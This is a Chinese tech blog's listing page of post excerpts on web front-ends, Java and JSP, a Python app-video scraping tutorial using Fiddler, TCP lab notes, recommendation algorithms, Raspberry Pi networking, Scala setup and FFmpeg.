&lt;el-menu :default-active="$route.path" router&gt; &lt;el-submenu index="1"&gt; &lt;template slot="title"&gt; &lt;span&gt;菜单栏&lt;/span&gt; &lt;/template&gt; &lt;el-menu-item index="/"&gt;菜单1&lt;/el-menu-item&gt; &lt;el-menu-item index="/SetWarningMsg"&gt;菜单2&lt;/el-menu-item&gt; &lt;/el-submenu&gt; &lt;/el-menu&gt; 当index="/SetWarningMsg"与:default-active="$route.path"对应上的时候就会显示高亮了～
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/66684df94ca1549beb997162b171b61b/" rel="bookmark">
			【艾琪出品】《计算机应用基础》【试题汇总4】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		南开大学-20秋学期（1709、1803、1809、1903、1909、2003、2009 ）《大学计算机基础》在线作业
1. 在Excel中，取消工作表的自动筛选后（ ）。
A 工作表的数据消失
B 工作表恢复原样
C 只剩下符合筛选条件的记录
D 不能取消自动筛选
2. 不属于大数据特征的是（ ）。
A 数量大
B 种类多
C 价值高
D 时间长
3. 剪切、复制和粘贴3个操作的快捷键分别为（ ）。
A Ctrl+C、Ctrl+X、Ctrl+V
B Ctrl+X、Ctrl+C、Ctrl+V
C Ctrl+V、Ctrl+X、Ctrl+C
D Ctrl+X、Ctrl+V、Ctrl+C
4. 计算机中采用二进制0和1的原因，下面说法不正确的是( )。
A 计算机中只能识别0和1
B 便于逻辑运算
C 物理上容易实现
D 二进制运算简单，速度快
5. 只能从CPU向外单向传输信号的总线是（ ）。
A 地址总线
B 控制总线
C 数据总线
D 内部总线
6. 在下列操作系统中，属于分时系统的是（ ）。
A UNIX
B MS DOS
C Windows XP
D Novell Netware
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/66684df94ca1549beb997162b171b61b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/da243f5fdcb3446b855d53fbdc52e489/" rel="bookmark">
			谁说app的视频抓取不了的？用Python爬取整个app视频
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 随着手app的发展逐渐强大，我们手机应用每天的生活也是非常的多。那我们怎么知道他的数据是怎么形成的，通过电脑端如何爬取。相信大家也有这样的问题。下面我将讲解这些操作流程。
一、操作流程 首先我们要有
fidder4夜神模拟器pycharmpython3.0或以上版本 二、fidder4抓包 1.fidder配置 首先我们先下载fidder，
打开Fiddler，点击Tools =&gt; Options 打开配置选项，切换到第二个标签页HTTPS，先在这里打勾
PS：如有需要Python学习资料的小伙伴可以加点击下方链接自行获取
python免费学习资料以及群交流解答点击即可加入
然后就是点下面如图所示的单选框，点击Actions，运行第一个Trust Root Certificate。后面会有一个框，记得点击确定。
打开Fiddler，点击Tools =&gt; Options… 打开配置选项，切换到第三个标签页Connections，修改如图所示的地方，端口号可任意修改，这里使用我自定的9999，请记住自己设置的端口号，后面有需要使用的地方。
2.模拟器配置 我们为什么使用模拟器，因为由于Fidder抓包，要在局域网环境下，我们大部分电脑都是以宽带连接，所以我这里就以模拟器讲解抓包，后续我会更新一期fidder手机抓包。
这里们先打模拟器，设置模拟器的代理。我们先查看自己的本机IP，通过cmd命令输入ipconfig即可查看本机的ip，我的本机IP是192.168.1.2
这里打开模拟器的设置，找到我们WLAN用点击，我们看到我们的wifi,用鼠标点击时间长一点，它会出现设置的，下面我用视频给大家看一下
我们本机ip进行代理哦
3.模拟器证书安装 我们用模拟器打开浏览器，输入我们本机ip加端口，就是 192.168.1.2:9999
点击这个下载证书，下载完成后安装证书，命名随便命名。密码自己要记入。
上述如果都做成功了，应该就没什么问题了。
三、fidder4解析视频网站 这是我们模拟器里的app，app名字我会在下面评论发出。
这里的所和上面的正好相对应，这里相信我们大家都找到了，
我们可以把fidder抓包到的数据在这里，这个是我们的数据网址
https://v.6.cn/coop/mobile/index.php?act=recommend&amp;padapi=minivideo-getlist.php&amp;page=1
我们通过模拟器视频往下滑，可以知道它是分页的，那样会有好多小姐姐视频哦，
https://v.6.cn/coop/mobile/index.php?act=recommend&amp;padapi=minivideo-getlist.php&amp;page=2
这里就是第二页的数据，这个时候就可以通过pycharm进行解析了。
pycharm编写app代码 import requests import json def Demo(page): url='https://v.6.cn/coop/mobile/index.php?act=recommend&amp;padapi=minivideo-getlist.php&amp;page={}'.format(page) header={ 'User-Agent':'XY0xDgIxDAS)wgtOthPHTn5AQUVFdXLOCRwSdEhX5PGQFmlHo6n22D)bw973lz13W2)XlZe8pKEpEEdBTgmU4ricT3kQENEI04ATJcbg2VsnEcvoVttmTXpq7r)sVToAdNLqmaxF1B6HFigkhXgO(f)rCw@@' } response = requests.get(url,headers=header,verify=False).json() data=response['content']['list']	#由于网站是json数据我们可以通过json解析，然后在进行数据的爬取 for i in data: title =i['title'] #这里爬取的是视频标题 playurl=i['playurl']	#这里是爬取是的视频的url Video(title,playurl) def Video(title,playurl): header = { 'User-Agent': 'XY0xDgIxDAS)wgtOthPHTn5AQUVFdXLOCRwSdEhX5PGQFmlHo6n22D)bw973lz13W2)XlZe8pKEpEEdBTgmU4ricT3kQENEI04ATJcbg2VsnEcvoVttmTXpq7r)sVToAdNLqmaxF1B6HFigkhXgO(f)rCw@@' } response = requests.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/da243f5fdcb3446b855d53fbdc52e489/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ed3432ce36d58f41212ee7800e9e4df5/" rel="bookmark">
			Java 常用设计模式 -- Builder模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Builder模式是在Java中最流行的模式之一。它很简单，有助于保持对象不可变，并且可以使用Project Lombok的@Builder或Immutables等工具生成，仅举几例。
模式的流畅变体示例： public class User { private final String firstName; private final String lastName; User(String firstName, String lastName) { this.firstName = firstName; this.lastName = lastName; } public static Builder builder() { return new Builder(); } public static class Builder { String firstName; String lastName; Builder firstName(String value) { this.firstName = value; return this; } Builder lastName(String value) { this.lastName = value; return this; } public User build() { return new User(firstName, lastName); } } } 调用方式：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ed3432ce36d58f41212ee7800e9e4df5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/14c4f8c8d3ba58e55a7c7fd3dd866b86/" rel="bookmark">
			【计算机网络】Stanford CS144（原实验相关内容已删）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原博客内容已删，仅仅保留环境配置和一些调试的记录。原因如下： 写的质量很差，代码是有问题的，浪费别人看博客的时间，同时也会误导大家，影响大家写代码的思路。只要不能保证每次跑测试都稳定通过lab4，实际上实现的就是有问题的。我和朋友讨论的结果是，必须把状态图上的所有内容都清楚每步是啥样的该做什么，才能最终完全写对。实现的时候虽然pdf上说了不要求记录状态，我代码主体思路是没记录状态，但是实际上我跑十几次lab4就会发现有失败的现象。然后打日志自己手动跑测试调用的脚本的时候发现，由于FIN交错，实际上状态转换图上的所有状态和每条路线都是有可能被走上去的。实现的Tcp应该保证完全遵从tcp状态图，不然边边角角的样例迟早会出错，因此就产生了矛盾，我重构完全按照状态转换搞。体会：这个实验给我的感觉是，lab4完全通过之前写的啥都不一定是正确的，如果做完lab4对tcp状态转换图不能非常熟悉（不止是能看懂，还要了如执掌），那实现多半就是错的。尽管我跑lab4十几次都能连续通过，代码依然代码是有问题的。实验的过程中发生了如下timeout的情况，和朋友讨论应该是Linux的tcp的协议和我们的不够匹配。（红线圈出来那一行探测窗口的包丢了就会造成tcp废了），按照我们实现的逻辑，后续那些探测窗口的包应该重传的是bytes=4的包，而不是一个空包）。（尝试让我们的Tcp兼容这个集成测试（linux socket?)，但是往往过不去之前的单元测试）。不过我保留这个问题只要不把扩大窗口的包丢了就依然可以通过所有测试。
仓库,其中sponge-v1-fai分支是我重构之前的代码，可能有其他bug，但是打开被注释掉的日志足以把上图的关于linux socket的行为给展现出来。master分支是重构之后的代码。
目录 环境搭建LAB0Networking by handFetch a web pageSend yourself an email Writing a network program using an OS stream socketWriting webget 调试方法论 参考 环境搭建 开始时，我使用的是ubuntu16.04，apt下载的gcc版本较低，中间make编译时发现gcc要求8+（lab0的pdf也明确说明），装了半天没成功于是又装了一个ubuntu20.04。之后参考课程网站lab0的pdf，在git上clone项目即可开始实验。
如果编译无法通过，则需要下载下述的包。可以参考Ubuntu下libpcap安装步骤。
LAB0 Networking by hand Fetch a web page 使用telnet 发送http（命令中http换成80也是可以的)请求，需要注意的最后一行需要输入一个回车。
Send yourself an email 可以尝试使用国内的邮箱，稍微比文档中的要麻烦一些。
Writing a network program using an OS stream socket 本次lab的核心，分别是实现一个get_URL函数以及完成一个字节流控制类，在开始之前，最好仔细读一下PDF。有详细的文档、作业要求以及对于C++的使用有一些要求。
Writing webget 实现webget，这是一个使用操作系统的TCP支持和流套接字抽象在Internet上提取网页的程序，就像上面使用telnet进行的操作一样。
webget.cc
void get_URL(const string &amp;host, const string &amp;path) { TCPSocket sock1; sock1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/14c4f8c8d3ba58e55a7c7fd3dd866b86/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/30a3baa82d1282cee3442ba47aa7e6be/" rel="bookmark">
			ALS算法介绍（协同过滤算法介绍）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一、ALS算法概括二、ALS算法原理及运用（1）、协同过滤（2）、ALS算法工作原理（3）、ALS算法输入的参数 三、代码实现 一、ALS算法概括 1、ALS算法用来补全用户评分矩阵。由于用户评分矩阵比较稀疏，将用户评分矩阵进行分解，变成V和U的乘积。通过求得V和U两个小的矩阵来补全用户评分矩阵。
2、ALS算法使用交替最小二乘法来进行求解
3、ALS分为显示反馈和隐式反馈两种。显示反馈是指用户有明确的评分。对于商品推荐来说，大部分是通过用户的行为，获取隐式反馈的评分。隐式反馈评分矩阵需要进行处理，如果有用户评分则置为1，没有则赋值为0。但是对这个处理后的评分矩阵，再有一个置信度来评价这个评分。置信度等于1+a*用户真实评分
4、ALS的代价函数是估计值和现有的评分值误差的平方和，引入了L2正则
二、ALS算法原理及运用 ALS：交替最小二乘（alternating least squares）的简称。在机器学习中，ALS特指使用交替最小二乘求解的一个协同推荐算法。它通过观察到的所有用户给商品的打分，来推断每个用户的喜好并向用户推荐适合的商品。
在ALS算法出现前，协同过滤算法是最适合做类似的工作的，理解ALS算法工作原理前可以先了解一下协同过滤的工作原理。
（1）、协同过滤 1 什么是协同过滤
协同过滤是利用集体智慧的一个典型方法。要理解什么是协同过滤 (Collaborative Filtering, 简称 CF)，首先想一个简单的问题，如果你现在想看个电影，但你不知道具体看哪部，你会怎么做？大部分的人会问问周围的朋友，看看最近有什么好看的电影推荐，而我们一般更倾向于从口味比较类似的朋友那里得到推荐。这就是协同过滤的核心思想。
换句话说，就是借鉴和你相关人群的观点来进行推荐，很好理解。
2 协同过滤的实现
要实现协同过滤的推荐算法，要进行以下三个步骤：
收集数据——找到相似用户和物品——进行推荐
收集数据
这里的数据指的都是用户的历史行为数据，比如用户的购买历史，关注，收藏行为，或者发表了某些评论，给某个物品打了多少分等等，这些都可以用来作为数据供推荐算法使用，服务于推荐算法。需要特别指出的在于，不同的数据准确性不同，粒度也不同，在使用时需要考虑到噪音所带来的影响。
找到相似用户和物品
这一步也很简单，其实就是计算用户间以及物品间的相似度。以下是几种计算相似度的方法：
欧几里德距离
皮尔逊相关系数
Cosine 相似度
Tanimoto 系数
进行推荐
在知道了如何计算相似度后，就可以进行推荐了。
在协同过滤中，有两种主流方法：基于用户的协同过滤，和基于物品的协同过滤。具体怎么来阐述他们的原理呢，看个图大家就明白了
基于用户的 CF 的基本思想相当简单，基于用户对物品的偏好找到相邻邻居用户，然后将邻居用户喜欢的推荐给当前用户。计算上，就是将一个用户对所有物品的偏好作为一个向量来计算用户之间的相似度，找到 K 邻居后，根据邻居的相似度权重以及他们对物品的偏好，预测当前用户没有偏好的未涉及物品，计算得到一个排序的物品列表作为推荐。 下图给出了一个例子，对于用户 A，根据用户的历史偏好，这里只计算得到一个邻居 - 用户 C，然后将用户 C 喜欢的物品 D 推荐给用户 A。
基于物品的 CF 的原理和基于用户的 CF 类似，只是在计算邻居时采用物品本身，而不是从用户的角度，即基于用户对物品的偏好找到相似的物品，然后根据用户的历史偏好，推荐相似的物品给他。从计算的角度看，就是将所有用户对某个物品的偏好作为一个向量来计算物品之间的相似度，得到物品的相似物品后，根据用户历史的偏好预测当前用户还没有表示偏好的物品，计算得到一个排序的物品列表作为推荐。下图给出了一个例子，对于物品 A，根据所有用户的历史偏好，喜欢物品 A 的用户都喜欢物品 C，得出物品 A 和物品 C 比较相似，而用户 C 喜欢物品 A，那么可以推断出用户 C 可能也喜欢物品 C。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/30a3baa82d1282cee3442ba47aa7e6be/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9426e03cc4c117b415219af998aa4109/" rel="bookmark">
			springMVC文件上传和springMVC对json的处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转载请标明出处：https://blog.csdn.net/men_ma/article/details/106847165.
本文出自 不怕报错 就怕不报错的小猿猿 的博客
springMVC文件上传和对json的支持 目录结构图1、springMVC文件上传1.1 实现的目标效果图1.2 实现的操作步骤过程1.2.1 实现文件上传的思路步骤（语法） 2、springMVC对json的处理2.1测试的操作步骤过程（案例） 目录结构图 1、springMVC文件上传 1.1 实现的目标效果图 提交后效果：
测试是否提交成功：
1.2 实现的操作步骤过程 1.2.1 实现文件上传的思路步骤（语法） springMVC的文件上传： * 1、上传界面 * form多功能表单enctype="mutipart/form-data" method="post" * 2、写一个方法@requestMapping("/upload") * MutipartFile file * 3、完成图片的虚拟映射 * 4、为了开发便捷，需要引入common-fileUpload * FileUtil.copyinputStreamtoFile(inputStream,target) 第一步：建立upload.jsp文件上传的界面
upload.jsp：
&lt;%-- Created by IntelliJ IDEA. User: zjjt Date: 2020/10/21 Time: 0:09 To change this template use File | Settings | File Templates. --%&gt; &lt;%@ page contentType="text/html;charset=UTF-8" language="java" %&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;文件上传&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9426e03cc4c117b415219af998aa4109/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3a7b562c862a07980dec1a80237a72ba/" rel="bookmark">
			抖音一键批量下载无水印视频,这款软件帮助你
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言
上次分享了安卓端下载抖音无水印小视频,但是总有些人不满足,比如上次分享的软件苹果手机不能直接下载无水印视频,需要用链接去解析,而且手机一个个下载太麻烦？咋办？这款小神器让你一键批量下载无水印抖音视频,不说来多了拉下去来详情！
关注公众号“蛋皮科技”回复“014”获取下载地址 本期推荐：
软件名称：抖音信息解读
运行平台：windows
软件简介：一键批量下载抖音视频
软件教程:
1:复制用户地址,粘贴到软件点击读取即可获取视频
（下载单个视频复制单独的视频地址）
2:当然可以下载全部也可以单个下载,功能界面一览无遗
（可根据自己要求进行下载你中意的ta）
最后
▼
这款软件是不是很棒棒呢？避免了你去一个链接一个链接复制下载,中意谁？全部给ta下过来！然后丢在电脑上慢慢欣赏吧！当然对于那些搬运的朋友们来说绝对是一款不可多得的小神器啊！蛋皮这边分享的软件就是这么简单暴力！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a80b9e76cd7b5a60a0a3ef7eda8a1fc5/" rel="bookmark">
			用JSP做个简单的登录注册页面
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		用JSP做个简单的登录注册页面 第一步先分析整个过程，然后得出大概思路。
首先，进入登录页面（login.jsp），如下：
我们是没有账号的所以需要注册账号，所以这时候必须有一个注册页面（register.jsp）,如下
紧接着注册成功后跳转成功页面，这时我们需要一个注册成功的页面（registersuccess.jsp）,如下：
点击返回页面后，我们就可以在登录页面登录，然后登录时有登录成功和登录失败的页面。所以还要再写两个（loginsuccess.jsp loginfailure.jsp）如下:
这就是大概的一个思路了，接下来就是代码问题了。
登录页面代码 &lt;%@ page language="java" contentType="text/html; charset=utf-8" pageEncoding="utf-8"%&gt; &lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt; &lt;html&gt; &lt;head&gt; &lt;meta http-equiv="Content-Type" content="text/html; charset=ISO-utf-8"&gt; &lt;title&gt;登录&lt;/title&gt; &lt;style&gt; #a { width:50%; height:200px; border: 1px dashed ; background-color:lightyellow; text-align:center; } body{ background-color:lightblue; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div id="a"&gt; &lt;h1&gt;登录界面&lt;/h1&gt; &lt;form action="check.jsp" method="post"&gt; 账号:&lt;input type="text" name="id"/&gt; &lt;br&gt; 密码:&lt;input type="password"name="password"/&gt; &lt;br&gt; &lt;input type="submit" value="login"/&gt; 没有账号？&lt;a href ="register.jsp"&gt;注册账号&lt;/a&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 注册页面代码 &lt;%@ page language="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a80b9e76cd7b5a60a0a3ef7eda8a1fc5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c1d25f9557a08c2c14ecf1acb09e7c32/" rel="bookmark">
			Visualgo -- 数据结构和算法动态可视化网站
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		网址为：https://visualgo.net/zh/。这个网站涉及的算法十分全面，不仅支持多种算法可视化动态演示，还支持搜索，是学习算法的好帮手，推荐给大家。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d4e6517afab80411482442f24ef08655/" rel="bookmark">
			数字特征值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 题目 数字特征值（5分）
题目内容：
对数字求特征值是常用的编码算法，奇偶特征是一种简单的特征值。对于一个整数，从个位开始对每一位数字编号，个位是1号，十位是2号，以此类推。这个整数在第n位上的数字记作x，如果x和n的奇偶性相同，则记下一个1，否则记下一个0。按照整数的顺序把对应位的表示奇偶性的0和1都记录下来，就形成了一个二进制数字。比如，对于342315，这个二进制数字就是001101。
这里的计算可以用下面的表格来表示：
数字数位数字奇偶数位奇偶奇偶一致二进制位值36奇偶03245偶奇01624偶偶1833奇奇1412奇偶0251奇奇11 你的程序要读入一个非负整数，整数的范围是[0,1000000]，然后按照上述算法计算出表示奇偶性的那个二进制数字，输出它对应的十进制值。
提示：将整数从右向左分解，数位每次加1，而二进制值每次乘2。
输入格式:
一个非负整数，整数的范围是[0,1000000]。
输出格式：
一个整数，表示计算结果。
输入样例：
342315
输出样例：
13
源代码 #include&lt;stdio.h&gt; int main() { int a;//记录将要进行判断的数 int sum=0; int flag=0; double p=0.5;//记录该位上是2的几次方 int i=1;//记录数字所在的位数----第i位 scanf("%d",&amp;a); do{ if(i++%2==a%10%2) flag=1; else flag=0; a /=10;//更新a 的值 p *=2;//2 的p 次方 sum += flag*p;//对应的10 进制数 }while(a!=0); printf("%d",sum); return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/057f700474fef12010bf6432a8ff47aa/" rel="bookmark">
			HTML&#43;CSS在线做题网页版-数据结构版
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		下面图片是网页的效果示意图： （只有选择题哦，且是随机出题）
第一步：首先要下载js文件
去本人博客就能免费下载
本人博客链接：http://zhenyunboy.icu/?p=302
第二步：将下面html代码复制到你的html代码中运行即可：
&lt;!doctype html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;&lt;/title&gt; &lt;meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no" /&gt; &lt;link href="css/mui.css" rel="stylesheet" /&gt; &lt;title&gt;公共类-营业类- Download by http://www.codefans.net&lt;/title&gt; &lt;link href="https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css" rel="stylesheet"&gt; &lt;link rel="stylesheet" href="js/index.css" type="text/css" /&gt; &lt;style type="text/css"&gt; /*打印时，背景为白色*/ @media print{ body{ font-size:12px; background-color:#fff; } .div_topic{ padding:5px; border:#000 dashed; border-width: 0 0 1px 0; background-color:#fff; } .div_topic h4{ font-size:14px; color:#000; } .div_topic h4 span{ display:none} #answer_last { background-color:#eee; border:1px dashed #333; color:#000000; display:block; position: static; width:auto; height:auto; } } &lt;/style&gt; &lt;script src="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/057f700474fef12010bf6432a8ff47aa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/76c0f7a59c2d78964e1a8a5bd586ca43/" rel="bookmark">
			hdfs：不小心删除了NameNode，如何恢复？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://mp.weixin.qq.com/s?__biz=MzI4OTY3MTUyNg==&amp;mid=2247495873&amp;idx=1&amp;sn=2aa2057c70e954baa3cecd4ab2a8c170&amp;chksm=ec2920c8db5ea9deb61c51a76d2d170df51ff7ff78f4ec9223123ee829791ff199a989b7d9ac&amp;scene=21#wechat_redirect
https://cloud.tencent.com/developer/article/1545708
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9aef28ba33ef81105dd4e12e63aa8275/" rel="bookmark">
			树莓派的IP地址查找
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		陈拓 chentuo@ms.xab.ac.cn 2020/10/19-2020/10/21
1. 概述 在《电脑连接树莓派3B+》https://blog.csdn.net/chentuo2000/article/details/103332186
和《树莓派修改HostName》
https://zhuanlan.zhihu.com/p/266689387
两篇文章中我们介绍了电脑用SSH通过主机名Host Name连接树莓派的方法。
用IP地址连接树莓派更快一些，但局域网一般都使用动态IP地址，每次开机启动获取的IP地址不一样，下面分别在Windows系统下和在Linux系统下获取树莓派当前IP地址的方法。
2. Windows系统 记录树莓派的MAC地址 第一次使用树莓派时记录下这个树莓派的MAC地址
ifconfig
树莓派的MAC地址是b8:27:eb:ae:9d:c3
打开COM窗口 按“Win + R”快捷键,在打开的“运行”对话框中,输入“cmd”后按回车键。
查本机IP ipconfig /all
我的PC是通过WiFi接入局域网的，所以查看“无线局域网适配器 WLAN”。
查本网段活跃的IP 知道了本机所在的网段，再将本网段所有IP地址轮询ping一遍。
for /L %i IN (1,1,254) DO ping -w 2 -n 1 192.168.1.%i
等待几分钟，命令处理完成后在cmd命令窗口输入arp -a
这就是当前本网段所有活跃的IP地址。
我的树莓派的MAC地址是b8:27:eb:ae:9d:c3，所对应的IP地址为：192.168.1.37
测试一下：
用PuTTY或Windows 10自带的ssh客户端登录树莓派 我们用Windows自带的ssh登录：
成功！
3. Linux系统 以Ubuntu系统为例。
登录Linux系统 可以用主机名Host Name登录，也可以用IP地址登录。
我的主机名为xxxx，用户名是ct。用主机名登录：
ssh ct@xxxx
查看系统版本 uname -a
查本机IP 如果是用主机名登录的，不知道IP，可以用ifconfig命令查询：
清除网络接口enp1s0的arp sudo ip neigh flush dev enp1s0
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9aef28ba33ef81105dd4e12e63aa8275/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/43759ca61ebc477bb2bd95b14220c536/" rel="bookmark">
			ubuntu18.04&#43;rviz&#43;键盘任意输入时发生段错误
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		环境： Ubuntu18.04 ROS Melodic
问题：运行rviz，键盘输入任意键值，rviz由于段错误退出
解决方案：yaml版本不对，重新在终端运行sudo apt-get --reinstall install libyaml-cpp0.5v5
问题解决
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/98c3f1d459e9f5cbf706cf0929e7582c/" rel="bookmark">
			RadioButton多行显示
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		日常使用单行的时候都是以列表的形式，如横向或者竖向，而一但需要多行显示的时候就不行了，如下面的效果图：
实现这样的效果图有以下几种思路：
使用RadioGroup竖向布局。中间嵌套LinearLayout来使用。但是这样RadioGroup会失去单选的功能，因为所有的RadioButton必须作为RadioGroup的子view才行。分2行RadioGroup。使用RadioGroup的setOnCheckChangeListener来监听，当选中的radio是属于group1的时候，使用group2的clearCheck()方法清空group2的状态，反之亦然。但是由于使用clearCheck()方法时也会回调checkChange()方法，所以方法执行时无法判断是选中时回调的方法还是清空时回调的方法重写RadioGroup。让其支持多行显示，但是这样太复杂了。使用RadioButton数组。不使用RadioGroup的setOnCheckChange方法，使用RadioButton的setOnCheckChange方法来手动管理radio的状态 我比较倾向第4种，以下是实现方式：
.xml文件
&lt;RadioGroup android:layout_width="match_parent" android:layout_height="wrap_content" android:id="@+id/rg_firstLine" android:layout_marginTop="@dimen/margin_xxlarge" android:orientation="horizontal"&gt; &lt;RadioButton style="@style/discount" android:id="@+id/rb_discount0" android:checked="true" android:layout_marginStart="@dimen/margin_xxlarge" android:text="@string/label_no_discount" /&gt; &lt;RadioButton style="@style/discount" android:id="@+id/rb_discount1" android:text="@string/label_discount1" /&gt; &lt;RadioButton style="@style/discount" android:id="@+id/rb_discount2" android:text="@string/label_discount2" /&gt; &lt;RadioButton style="@style/discount" android:id="@+id/rb_discount3" android:text="@string/label_discount3" /&gt; &lt;RadioButton style="@style/discount" android:id="@+id/rb_discount4" android:text="@string/label_discount4" /&gt; &lt;/RadioGroup&gt; &lt;RadioGroup android:layout_width="match_parent" android:layout_height="wrap_content" android:id="@+id/rg_secondLine" android:layout_marginTop="@dimen/margin_large" android:orientation="horizontal"&gt; &lt;RadioButton style="@style/discount" android:id="@+id/rb_discount5" android:layout_marginStart="@dimen/margin_xxlarge" android:text="@string/label_discount5" /&gt; &lt;RadioButton style="@style/discount" android:id="@+id/rb_discount6" android:text="@string/label_discount6" /&gt; &lt;RadioButton style="@style/discount" android:id="@+id/rb_discount7" android:text="@string/label_discount7" /&gt; &lt;RadioButton style="@style/discount" android:id="@+id/rb_discount8" android:text="@string/label_discount8" /&gt; &lt;RadioButton style="@style/discount" android:id="@+id/rb_discount9" android:text="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/98c3f1d459e9f5cbf706cf0929e7582c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2891c90f7c465a0ecf34e5a986636a09/" rel="bookmark">
			Scala2.11安装——windows以及IntelliJ IDEA 2018.2.2版本Scala插件安装（有安装包下载链接）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Scala安装——windows Scala----windows安装文件及IDEA 2018.2.2插件：
1、scala-2.11.12.msi
2、scala-intellij-bin-2018.2.4.zip
下载链接：https://pan.baidu.com/s/1WkK4cp91Ov5p4HjysHhZ5w
提取码：xaiz
1、双击 scala-2.11.12.msi 进行安装：
一直点击next
记住安装地址
右击我的电脑----属性----高级系统设置----环境变量----Path----编辑
配置系统环境变量:
添加Scala安装地址：
win+r打开cmd
使用cmd命令行检验是否安装成功
输入scala出现如下图 即为成功
IntelliJ IDEA 2018.2.2 scala插件安装 scala插件：scala-intellij-bin-2018.2.4.zip
1、打开IDEA
点击 Settings
点击 Plugins
Install plugin from disk…
找到插件 点击OK
出现Scala 即为成功
创建一个Scala 工程
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7471788573a377313c5b8de070bbef96/" rel="bookmark">
			FFmpeg 视频处理入门教程(转)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		FFmpeg 视频处理入门教程(阮一峰)
FFmpeg 是视频处理最常用的开源软件。
它功能强大，用途广泛，大量用于视频网站和商业软件（比如 Youtube 和 iTunes），也是许多音频和视频格式的标准编码/解码实现。
FFmpeg 本身是一个庞大的项目，包含许多组件和库文件，最常用的是它的命令行工具。本文介绍 FFmpeg 命令行如何处理视频，比桌面视频处理软件更简洁高效。
如果你还没安装，可以根据官方文档 先完成安装。
一、概念 介绍 FFmpeg 用法之前，需要了解一些视频处理的基本概念。
1.1 容器
视频文件本身其实是一个容器（container），里面包括了视频和音频，也可能有字幕等其他内容。
常见的容器格式有以下几种。一般来说，视频文件的后缀名反映了它的容器格式。
MP4MKVWebMAVI 下面的命令查看 FFmpeg 支持的容器。
$ ffmpeg -formats
1.2 编码格式 视频和音频都需要经过编码，才能保存成文件。不同的编码格式（CODEC），有不同的压缩率，会导致文件大小和清晰度的差异。
常用的视频编码格式如下。
